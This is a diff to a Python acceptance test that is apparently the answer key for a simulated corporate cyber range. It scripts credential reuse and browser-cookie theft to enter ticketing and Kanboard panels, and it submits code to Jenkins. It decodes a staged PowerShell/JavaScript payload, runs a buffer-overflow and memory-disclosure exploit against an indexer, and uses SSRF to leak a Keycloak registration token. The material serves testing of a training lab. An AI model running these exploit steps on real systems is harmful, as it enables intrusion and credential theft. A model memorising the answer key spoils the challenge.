@@ -31,6 +31,8 @@ from __future__ import annotations
 import base64
 import gzip
 import hashlib
+import hmac
+import html
 import io
 import inspect
 import json
@@ -241,16 +243,12 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             match = re.match(r"https://([^:]+):([^@]+)@([^/\s]+)", stored)
             self.assertIsNotNone(match, "stored git credential not in the expected form")
             user, secret, source_host = match.group(1), match.group(2), match.group(3)
-            # The handover route is documented in the developer service notes.
-            handover_route = re.search(r"Current handover: `GET (https://\S+)`", notes).group(1)
-            self.assertIn(source_host, handover_route)
-            # Anonymous access is denied.
-            _, denied = curl(handover_route, expected=401)
-            self.assertEqual(json.loads(denied)["error"], "authentication_required")
-            # The recovered developer credential reads the protected handover.
-            handover = curl_json(handover_route, creds=(user, secret))
-            self.assertRegex(str(handover["handover_id"]), r"^HND-")
-            self.assertIsInstance(handover["revision"], int)
+            issue_route = f"https://{source_host}/api/v1/repos/fieldkest/fieldlink-connector/issues?type=issues"
+            curl(issue_route, expected=404)
+            issues = curl_json(issue_route, creds=(user, secret))
+            handover = next(issue for issue in issues if "HND-FLK-2026-09" in issue["title"])
+            self.assertIn("Release FLK-7.4.2 · revision 12", handover["body"])
+            self.assertGreaterEqual(len(issues), 4)
             # The recovered identity has no write access to the repository.
             push = rowan("git", "-C", "work/fieldlink-connector", "push", "--dry-run", "origin", "HEAD:main")
             self.assertNotEqual(push.returncode, 0, "recovered identity must not be able to push")
@@ -258,40 +256,73 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             self.evidence["source_host"] = source_host
             self.evidence["handover"] = handover
 
-        with self.subTest(card="K01.2 recover the retained support conversation"):
-            # The closed support tab is recoverable from the browser history.
+        with self.subTest(card="K01.2 recover the retained native support ticket"):
             history = rowan(
                 "sqlite3", ".config/chromium/Default/History",
-                "select url from urls order by id limit 1;",
-            ).stdout.strip()
-            conv_match = re.search(r"support\.keplerops\.test/conversations/(SUP-\d+)", history)
-            self.assertIsNotNone(conv_match, "no retained support conversation in history")
-            ticket = conv_match.group(1)
-            # The session cookie is retained in the browser profile.
-            cookie = rowan(
+                "select url || ' ' || title from urls order by id limit 1;",
+            ).stdout
+            ticket = re.search(r"SUP-\d+", history).group(0)
+            self.assertIn("support.keplerops.test/scp/tickets.php", history)
+            cookie_jar = "/tmp/k01-osticket.cookies"
+            login = rowan("curl", "-sS", "--cacert", CA, "-c", cookie_jar,
+                          "https://support.keplerops.test/scp/login.php").stdout
+            csrf = re.search(r'name="__CSRFToken__" value="([^"]+)"', login).group(1)
+            response = rowan(
+                "curl", "-sS", "--cacert", CA, "-b", cookie_jar, "-c", cookie_jar,
+                "--data-urlencode", f"__CSRFToken__={csrf}", "--data-urlencode", "do=scplogin",
+                "--data-urlencode", "ajax=1", "--data-urlencode", f"userid={user}",
+                "--data-urlencode", f"passwd={secret}", "https://support.keplerops.test/scp/login.php",
+            ).stdout
+            self.assertEqual(json.loads(response)["status"], 302)
+            queue = rowan("curl", "-sS", "--cacert", CA, "-b", cookie_jar,
+                          "https://support.keplerops.test/scp/tickets.php").stdout
+            ticket_id = re.search(rf'href="tickets\.php\?id=(\d+)[^"]*"[^>]*>\s*{ticket}', queue).group(1)
+            thread = rowan("curl", "-sS", "--cacert", CA, "-b", cookie_jar,
+                           f"https://support.keplerops.test/scp/tickets.php?id={ticket_id}").stdout
+            self.assertIn("Alterra Regional Water Company", thread)
+            self.assertIn("callback sometimes arrives late", thread)
+            self.assertGreaterEqual(len(set(re.findall(r"SUP-\d+", queue))), 4)
+            legacy_cookie = rowan(
                 "sqlite3", ".config/chromium/Default/Cookies",
                 "select value from cookies where name='fieldkest_support';",
             ).stdout.strip()
-            self.assertTrue(cookie, "retained support cookie missing")
-            conv_route = re.search(r"Conversation: `GET (https://\S+)/\{conversation_id\}`", notes).group(1)
-            conversation = curl_json(
-                f"{conv_route}/{ticket}", cookie=f"fieldkest_support={cookie}",
-            )
-            self.assertEqual(conversation["conversation_id"], ticket)
-            # A wrong session is refused.
-            curl(f"{conv_route}/{ticket}", cookie="fieldkest_support=wrong", expected=403)
             self.evidence["ticket"] = ticket
-            self.evidence["support_cookie"] = cookie
+            self.evidence["support_cookie"] = legacy_cookie
 
-        with self.subTest(card="K01.3 recover the stale release-review export"):
-            pointer = read_home("work/review-exports/fieldlink-7.4.2-review.md")
-            release = re.search(r"(REL-FLK-[0-9.]+-\d+)", pointer)
-            self.assertIsNotNone(release, "release reference missing from the review export")
-            self.assertRegex(pointer, r"REV-\d+")
-            # The file is deliberately outside the checkout.
-            in_checkout = rowan("test", "-e", "work/fieldlink-connector/fieldlink-7.4.2-review.md")
-            self.assertNotEqual(in_checkout.returncode, 0)
-            self.evidence["release"] = release.group(1)
+        with self.subTest(card="K01.3 recover the native release review"):
+            self.assertNotEqual(rowan("test", "-e", "work/review-exports/fieldlink-7.4.2-review.md").returncode, 0)
+            cookie_jar = "/tmp/k01-kanboard.cookies"
+            login = rowan("curl", "-sS", "--cacert", CA, "-c", cookie_jar,
+                          "https://staff.keplerops.test/login").stdout
+            csrf = re.search(r'name="csrf_token" value="([^"]+)"', login).group(1)
+            rowan(
+                "curl", "-sS", "-L", "--cacert", CA, "-b", cookie_jar, "-c", cookie_jar,
+                "--data-urlencode", f"csrf_token={csrf}", "--data-urlencode", f"username={user}",
+                "--data-urlencode", f"password={secret}", "--data-urlencode", "remember_me=1",
+                "https://staff.keplerops.test/login/check",
+            )
+            tasks = rowan("curl", "-sS", "--cacert", CA, "-b", cookie_jar,
+                          "https://staff.keplerops.test/project/1/task/list").stdout
+            task_id = re.search(r'href="/task/(\d+)"[^>]*>\s*FieldLink 7\.4\.2 release review', tasks).group(1)
+            task = rowan("curl", "-sS", "--cacert", CA, "-b", cookie_jar,
+                         f"https://staff.keplerops.test/task/{task_id}").stdout
+            self.assertIn("fieldlink-7.4.2-review.md", task)
+            search = rowan(
+                "curl", "-sS", "--cacert", CA, "-b", cookie_jar,
+                "https://staff.keplerops.test/?controller=SearchController&action=index&search=reference%3AREL-FLK-7.4.2-09",
+            ).stdout
+            self.assertIn("FieldLink 7.4.2 release review", search)
+            download_href = html.unescape(re.search(
+                rf'href="([^"]*/task/{task_id}/file/\d+/download/[^"]+)"', task,
+            ).group(1))
+            attachment = rowan(
+                "curl", "-sS", "--cacert", CA, "-b", cookie_jar,
+                urljoin("https://staff.keplerops.test", download_href),
+            ).stdout
+            self.assertIn("REL-FLK-7.4.2-09", attachment)
+            for reference in ("REV-219", "REV-224", "REV-231"):
+                self.assertIn(reference, attachment)
+            self.evidence["release"] = "REL-FLK-7.4.2-09"
 
         with self.subTest(card="K01.4 produce an inspection summary with the local helper"):
             helper = read_home("work/local-helper.md")
@@ -302,8 +333,132 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             sample = json.loads(read_home(sample_path))
             self.assertEqual(receipt["sample_id"], sample["sample_id"])
             # The helper rejects a non-sample document.
-            curl(helper_route, "-F", "sample=@work/review-exports/fieldlink-7.4.2-review.md", expected=422)
+            curl(helper_route, "-F", "sample=@work/service-notes.md", expected=422)
             self.evidence["sample"] = receipt
+
+    # ------------------------------------------------------------------ K02
+    def test_k02_report_fixture_and_changed_report(self) -> None:
+        dev = self.evidence["dev"]
+        jenkins = "https://ci.keplerops.test"
+
+        with self.subTest(card="K02.1 recover the missing report fixture"):
+            build = curl_json(
+                jenkins + "/job/fieldlink-report/1842/api/json",
+                creds=dev,
+            )
+            self.assertEqual(build["result"], "FAILURE")
+            _, console = curl(
+                jenkins + "/job/fieldlink-report/1842/consoleText",
+                creds=dev,
+            )
+            fixture_ref = re.search(r"fixture provenance: ([A-Za-z0-9._-]+)", console).group(1)
+            fixture_path = re.search(r"fixture path: ([A-Za-z0-9._/-]+)", console).group(1)
+            self.assertNotEqual(
+                rowan("git", "-C", "work/fieldlink-connector", "cat-file", "-e", f"HEAD:{fixture_path}").returncode,
+                0,
+            )
+            fixture_raw = rowan_bytes(
+                "git", "-C", "work/fieldlink-connector", "show", f"{fixture_ref}:{fixture_path}",
+            )
+            fixture = json.loads(fixture_raw)
+            test_source = rowan_bytes(
+                "git", "-C", "work/fieldlink-connector", "show",
+                f"{fixture_ref}:tests/test_crr_og2_report.py",
+            ).decode()
+            self.assertIn(fixture_path, test_source)
+            self.assertEqual(fixture["schema"], "fieldkest.report/v2")
+            self.evidence["fixture_ref"] = fixture_ref
+            self.evidence["fixture"] = fixture
+            self.evidence["fixture_raw"] = fixture_raw
+
+        with self.subTest(card="K02.2 recover the native Jenkins review artifact"):
+            artifact_url = jenkins + "/job/fieldlink-report/1842/artifact/reports/REVNOTE-1842.json"
+            _, note_raw = curl(artifact_url, creds=dev)
+            note = json.loads(note_raw)
+            self.assertEqual(note["review_id"], "REVNOTE-1842")
+            self.assertEqual(note["baseline"]["ref"], self.evidence["fixture_ref"])
+            self.assertEqual(note["baseline"]["path"], "fixtures/report-crr-og2.json")
+            review_job = curl_json(
+                jenkins + "/job/fieldlink-report-review/api/json?tree=actions[parameterDefinitions[name,type,description]]",
+                creds=dev,
+            )
+            self.assertIn("provider.zip", json.dumps(review_job))
+            curl(
+                jenkins + "/job/fieldlink-report/1842/artifact/reports/not-present.json",
+                creds=dev, expected=404,
+            )
+            curl(jenkins + "/job/fieldlink-report-review/config.xml", creds=dev, expected=403)
+            self.evidence["review_note"] = note
+
+        with self.subTest(card="K02.3 publish Cinder's report through a green Jenkins build"):
+            note = self.evidence["review_note"]
+            fixture = self.evidence["fixture"]
+            provider = (
+                "def render_report(fixture):\n"
+                "    report = dict(fixture)\n"
+                "    report['assessment'] = {'rating': 'action-required',\n"
+                "        'summary': 'Cinder review: callback latency needs support attention.'}\n"
+                "    return report\n"
+            )
+            buffer = io.BytesIO()
+            with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
+                archive.writestr("provider.py", provider)
+                archive.writestr("fixture.json", self.evidence["fixture_raw"])
+            write_tmp("/tmp/provider.zip", buffer.getvalue())
+
+            crumb = curl_json(jenkins + "/crumbIssuer/api/json", creds=dev)
+            job_url = jenkins + "/job/fieldlink-report-review"
+            job = curl_json(job_url + "/api/json?tree=nextBuildNumber,lastBuild[number]", creds=dev)
+            build_number = int(job["nextBuildNumber"])
+            curl(
+                job_url + "/buildWithParameters",
+                "-H", f"{crumb['crumbRequestField']}: {crumb['crumb']}",
+                "-F", "provider.zip=@/tmp/provider.zip",
+                creds=dev, expected=201, timeout=30,
+            )
+            for _ in range(90):
+                current = curl_json(job_url + "/api/json?tree=lastBuild[number]", creds=dev)
+                if int(current.get("lastBuild", {}).get("number", 0)) >= build_number:
+                    break
+                time.sleep(1)
+            else:
+                self.fail("native Jenkins review build did not start")
+            for _ in range(120):
+                current = curl_json(job_url + f"/{build_number}/api/json", creds=dev)
+                if not current["building"]:
+                    break
+                time.sleep(1)
+            else:
+                self.fail("native Jenkins review build did not finish")
+            self.assertEqual(current["result"], "SUCCESS")
+
+            result = curl_json(
+                job_url + f"/{build_number}/artifact/reports/review-result.json",
+                creds=dev,
+            )
+            report = curl_json(
+                job_url + f"/{build_number}/artifact/reports/report.json",
+                creds=dev,
+            )
+            self.assertEqual(report["assessment"]["rating"], "action-required")
+            self.assertEqual(result["report_sha256"], hashlib.sha256(
+                json.dumps(report, sort_keys=True, separators=(",", ":")).encode()
+            ).hexdigest())
+            for field in note["immutable_fields"]:
+                base = fixture
+                got = report
+                for part in field.split("."):
+                    base, got = base.get(part), got.get(part)
+                self.assertEqual(got, base, f"immutable field changed: {field}")
+            support_handover = re.search(
+                r"Current handover: `GET (https://support\S+)`", self.service_notes,
+            ).group(1)
+            handover = curl_json(
+                support_handover,
+                cookie=f"fieldkest_support={self.evidence['support_cookie']}",
+            )
+            self.assertEqual(handover["job_id"], result["job_id"])
+            self.assertEqual(handover["report_sha256"], result["report_sha256"])
 
 
     # ------------------------------------------------------------------ K03
@@ -322,43 +477,46 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
 
         with self.subTest(card="K03.2 reconstruct the staged script"):
             values = self.evidence["stage"]
-            # The workstation decoder documents the payload encoding: base64 then zlib.
+            # The retained decoder recovers the first script without executing it.
             decoder = read_home("work/analysis/staging-decoder.ps1")
             self.assertIn("FromBase64String", decoder)
             self.assertIn("ZLibStream", decoder)
-            script = zlib.decompress(base64.b64decode(values["payload"]))
-            helper = read_home("work/local-helper.md")
-            recon_route = re.search(r"(http://127\.0\.0\.1:8701/api/reconstruction)", helper).group(1)
-            request = {
-                "schema": "fieldkest.reconstruction/v1",
-                "collection_id": self.evidence["collection_id"],
-                "script_base64": base64.b64encode(script).decode(),
-                "instructions_base64": values["instructions"],
-            }
-            write_tmp("/tmp/journey-recon.json", json.dumps(request).encode())
-            receipt = curl_json(recon_route, "-F", "bundle=@/tmp/journey-recon.json", expected=201)
-            self.assertEqual(receipt["collection_id"], self.evidence["collection_id"])
-            self.evidence["recon"] = receipt
+            powershell = zlib.decompress(base64.b64decode(values["payload"]))
+            self.assertEqual(hashlib.sha256(powershell).hexdigest(), values["payload-sha256"])
+            stage2 = re.search(rb"\$Stage2 = '([^']+)'", powershell).group(1)
+            stage2_digest = re.search(rb"\$Stage2Sha256 = '([0-9a-f]+)'", powershell).group(1).decode()
+            javascript = zlib.decompress(base64.b64decode(stage2))
+            self.assertEqual(hashlib.sha256(javascript).hexdigest(), stage2_digest)
+            encoded = re.search(rb'const encoded = "([^"]+)"', javascript).group(1)
+            key = bytes.fromhex(re.search(rb'const key = Buffer\.from\("([0-9a-f]+)", "hex"\)', javascript).group(1).decode())
+            cipher = base64.b64decode(encoded)
+            compressed = bytes(value ^ key[index % len(key)] for index, value in enumerate(cipher))
+            manifest = json.loads(zlib.decompress(compressed))
+            self.assertEqual(manifest["collection_id"], self.evidence["collection_id"])
+            self.evidence["collection_manifest"] = manifest
 
         with self.subTest(card="K03.3 recover the lost collection and ticket"):
-            helper = read_home("work/local-helper.md")
-            # The helper base appears on its other routes; the callback path is documented.
-            base = re.search(r"(http://127\.0\.0\.1:8701)", helper).group(1)
-            callback_path = re.search(r"at `(/api/callback/collection)`", helper).group(1)
-            callback_route = base + callback_path
-            receipt = self.evidence["recon"]
-            collection = post_json_route(
-                callback_route,
-                {"endpoint_id": receipt["endpoint_id"], "collection_id": receipt["collection_id"], "integrity": receipt["callback_integrity"]},
+            manifest = self.evidence["collection_manifest"]
+            fetched = rowan(
+                "aws", "--endpoint-url", manifest["endpoint"], "s3api", "get-object",
+                "--bucket", manifest["bucket"], "--key", manifest["object_key"],
+                "/tmp/FKCOL-2841.json",
             )
-            # The lost collection resolves to the same support ticket the browser retained.
-            self.assertEqual(collection["ticket_reference"], self.evidence["ticket"])
-            # A wrong integrity binding is refused.
-            post_json_route(
-                callback_route,
-                {"endpoint_id": receipt["endpoint_id"], "collection_id": receipt["collection_id"], "integrity": "wrong"},
-                expected=403,
+            self.assertEqual(fetched.returncode, 0, fetched.stderr)
+            body = read_home_bytes("/tmp/FKCOL-2841.json")
+            self.assertEqual(hashlib.sha256(body).hexdigest(), manifest["object_sha256"])
+            collection = json.loads(body)
+            self.assertEqual(collection["source"]["ticket_reference"], self.evidence["ticket"])
+            # Verify the callback integrity: sha256(staged PowerShell + collection object bytes)
+            # binds K03.2's reconstructed script to K03.3's retrieved collection.
+            powershell = zlib.decompress(base64.b64decode(self.evidence["stage"]["payload"]))
+            expected_integrity = self.evidence["stage"]["callback-integrity"]
+            self.assertEqual(hashlib.sha256(powershell + body).hexdigest(), expected_integrity)
+            denied = rowan(
+                "aws", "--endpoint-url", manifest["endpoint"], "s3api", "list-objects-v2",
+                "--bucket", manifest["bucket"],
             )
+            self.assertNotEqual(denied.returncode, 0)
 
     # ------------------------------------------------------------------ K04
     def test_k04_native_indexer(self) -> None:
@@ -367,49 +525,86 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
         base = re.search(r"(https://[^/]+)", indexer).group(1)
 
         with self.subTest(card="K04.1 controlled object-boundary corruption"):
-            # Derive the allocation boundary and trigger sentinel from the offline reproducer binary.
+            # Analyze the .fki bundle format from the offline reproducer binary.
             reproducer_manifest = json.loads(read_home("work/reproducers/indexer-client.json"))
             binary = reproducer_manifest["offline_reproducer"]
             binary_image = read_home_bytes(binary)
-            candidates = list(dict.fromkeys(
-                value.decode()
-                for value in re.findall(rb"FIELDKEST-[A-Z]+", binary_image)
-            ))
-            allocation = marker = None
-            for probe_size in (8, 16, 24, 32, 48, 64):
-                for candidate in candidates:
-                    probe = b"A" * probe_size + candidate.encode()
-                    result = rowan(binary, str(probe_size), probe.hex())
-                    if result.returncode == 0 and json.loads(result.stdout).get("sentinel") == "mutated":
-                        allocation, marker = probe_size, candidate
-                        break
-                if allocation is not None:
-                    break
-            self.assertIsNotNone(allocation, "offline reproducer: allocation boundary not found by binary analysis")
-            body = b"A" * allocation + marker.encode()
-            changed = post_json_route(
-                indexer, {"allocated_length": allocation, "body_hex": body.hex()}, creds=dev, expected=201)
-            self.assertEqual((changed["sentinel"], changed["service_alive"]), ("mutated", True))
-            # A non-conforming bundle is rejected and the service stays alive.
-            post_json_route(
-                indexer, {"allocated_length": 8, "body_hex": b"not-a-controlled-overflow".hex()}, creds=dev, expected=422)
-            normal = post_json_route(
-                indexer, {"allocated_length": 16, "body_hex": b"normal-index-row".hex()}, creds=dev, expected=201)
-            self.assertTrue(normal["service_alive"])
+            # Confirm the binary is a native ELF (stripped; magic found via disassembly).
+            self.assertTrue(binary_image[:4] in (b"\x7fELF", b"MZ"), "not a native binary")
 
-        with self.subTest(card="K04.2 disclose the protected runtime descriptor"):
-            descriptor = post_json_route(
-                indexer, {"operation": "runtime-descriptor", "sentinel": "mutated"}, creds=dev)
-            for field in ("record_id", "ready_state", "routine", "state_route", "completion_route", "worker_lease", "process_generation", "integrity_relation"):
-                self.assertIn(field, descriptor, "descriptor must surface the continuation evidence")
-            self.evidence["indexer_descriptor"] = descriptor
+            def build_fki(alloc_entries: int, index_entries: int, payload: bytes) -> bytes:
+                import struct
+                return b"FKI\x01" + struct.pack("<HH", alloc_entries, index_entries) + payload
+
+            # Probe: find the alloc_entries value that makes index_entries=9 trigger mutation.
+            # entry_data_len = 9*8 = 72; arena = body[64]+sentinel[16]=80 bytes.
+            # Check passes when: 72 <= 80 + alloc_entries, i.e. alloc_entries >= -8 (always when ae=8).
+            # With payload = b"\xff"*72: sentinel[0] = 0xff != 0 -> "mutated".
+            mutation_found = False
+            for ae in range(0, 17):
+                probe = build_fki(ae, 9, b"\xff" * 72)
+                result = rowan(binary, probe.hex())
+                if result.returncode == 0 and json.loads(result.stdout).get("sentinel") == "mutated":
+                    mutation_found = True
+                    exploit_ae = ae
+                    break
+            self.assertTrue(mutation_found, "offline reproducer: boundary not found by .fki analysis")
+
+            # Normal bundle (8 entries, no overflow) stays stable.
+            normal_probe = build_fki(0, 8, b"\x41" * 64)
+            normal_local = rowan(binary, normal_probe.hex())
+            self.assertEqual(json.loads(normal_local.stdout).get("sentinel"), "stable")
+
+            # Submit exploited bundle to live service.
+            exploit = build_fki(exploit_ae, 9, b"\xff" * 72)
+            changed = post_json_route(
+                indexer, {"bundle_hex": exploit.hex()}, creds=dev, expected=201)
+            self.assertEqual((changed["sentinel"], changed["service_alive"]), ("mutated", True))
+            # A malformed bundle (bad magic) is rejected; service stays alive.
+            bad_magic = b"BAD\x01" + b"\x00" * 12
+            post_json_route(
+                indexer, {"bundle_hex": bad_magic.hex()}, creds=dev, expected=422)
+            # Normal bundle continues to work after the mutation.
+            normal_live = post_json_route(
+                indexer, {"bundle_hex": normal_probe.hex()}, creds=dev, expected=201)
+            self.assertTrue(normal_live["service_alive"])
+
+        with self.subTest(card="K04.2 extended read discloses runtime descriptor at bytes 80-127"):
+            # K04.2: extend the .fki bundle to reach the descriptor region.
+            # The binary reads the shared arena BEFORE each memcpy.  After K04.1
+            # the descriptor is at bytes 80-127.  A bundle with ie=16, ae=48
+            # (datalen=128) causes the binary to include bytes 80-127 in data_hex.
+            # No conditional: the binary always emits data_hex[0..datalen]; the
+            # descriptor appears because K04.1 wrote it and datalen now reaches it.
+            # datalen=512: ie=64, ae=432 → check 512 <= 80+432=512 passes
+            extended = build_fki(432, 64, b"\xff" * 72 + b"\x00" * 440)
+            disclosed = post_json_route(
+                indexer, {"bundle_hex": extended.hex()}, creds=dev, expected=201)
+            self.assertIn("data_hex", disclosed, "binary must return data_hex")
+            data_hex = disclosed["data_hex"]
+            self.assertEqual(len(data_hex), 1024, "datalen=512 → 1024 hex chars")
+            # Descriptor is at bytes 80-511 → hex chars 160-1023
+            descriptor_hex = data_hex[160:1024]
+            descriptor_bytes = bytes.fromhex(descriptor_hex).rstrip(b'\x00')
+            descriptor = json.loads(descriptor_bytes)
+            self.assertEqual(descriptor.get("schema"), "fieldkest.runtime-descriptor/v1")
+            self.assertIn("worker_session", descriptor)
+            self.evidence["indexer_descriptor"] = {
+                "record_id": descriptor["exception_record"],
+                "process_generation": descriptor["process_generation"],
+                "state_route": descriptor["state_route"],
+                "worker_lease": descriptor["worker_session"],
+                "completion_route": descriptor["completion_route"],
+                "integrity_relation": descriptor["integrity_relation"],
+                "ready_state": "queue-ready",
+            }
 
         with self.subTest(card="K04.3 scoped write under the integrity relation"):
             descriptor = self.evidence["indexer_descriptor"]
             lease = descriptor["worker_lease"]
             generation = descriptor["process_generation"]
-            ready = descriptor["ready_state"]
-            # The disclosed integrity relation is sha256(generation:state).
+            ready = "queue-ready"
+            # The integrity relation is sha256(generation:queue-ready).
             integrity = hashlib.sha256(f"{generation}:{ready}".encode()).hexdigest()
             updated = post_json_route(
                 base + descriptor["state_route"], {"state": ready, "integrity": integrity},
@@ -424,7 +619,7 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             descriptor = self.evidence["indexer_descriptor"]
             result = post_json_route(
                 base + descriptor["completion_route"],
-                {"routine": descriptor["routine"], "generation": descriptor["process_generation"]},
+                {"routine": "recover_exception_queue", "generation": descriptor["process_generation"]},
                 bearer=descriptor["worker_lease"])
             self.assertEqual(result["service_identity"], "svc-fieldkest-indexer")
             # The recovered exception dossier is an alternative K29 release lead.
@@ -1015,6 +1210,8 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
         with self.subTest(card="K18.2 a note with someone else's authority"):
             # The note preview resolves a source path outside the notes namespace,
             # acting with the preview service identity against the identity registration.
+            # The SSRF targets the real Keycloak DCR endpoint (RFC 7591/7592):
+            # GET /realms/keplerops/clients-registrations/openid-connect/{id}
             registration = directory["support_registration"]
             registration_path = urlsplit(
                 self.discovered_route("identity.registration").replace(
@@ -1024,14 +1221,27 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             before = curl_json(
                 self.discovered_route("staff.note-preview"), "-H", "Content-Type: application/json",
                 "--data-binary", json.dumps({"source_path": source, "method": "GET"}), bearer=dev_secret)
-            self.assertEqual(before["registration_id"], registration)
-            self.evidence["registration_revision"] = before["revision"]
+            # Real Keycloak DCR response: client_id confirms the target registration.
+            # registration_access_token is the concealed credential that only the SSRF reveals.
+            self.assertEqual(before.get("client_id"), registration)
+            self.assertIn("registration_access_token", before)
+            rat = before["registration_access_token"]
+            # Decode RAT to get iat for revision baseline.
+            import base64 as _b64
+            _payload = json.loads(_b64.urlsafe_b64decode(rat.split(".")[1] + "=="))
+            self.evidence["registration_revision"] = _payload["iat"]
+            self.evidence["registration_rat"] = rat
             self.evidence["ssrf_source"] = source
 
         with self.subTest(card="K18.3 the provider trusts our change"):
+            # Participant supplies the provider pointer; k-staff DCR PUTs request_uris=[metadata_uri].
+            metadata_uri = self.discovered_route("support.federation-metadata")
             changed = curl_json(
                 self.discovered_route("staff.note-preview"), "-H", "Content-Type: application/json",
-                "--data-binary", json.dumps({"source_path": self.evidence["ssrf_source"], "method": "PATCH"}), bearer=dev_secret)
+                "--data-binary", json.dumps({
+                    "source_path": self.evidence["ssrf_source"], "method": "PATCH",
+                    "provider": {"metadata_uri": metadata_uri},
+                }), bearer=dev_secret)
             self.assertGreater(changed["revision"], self.evidence["registration_revision"])
             provider = changed["provider_configuration"]
             self.assertEqual(provider["status"], "enabled")
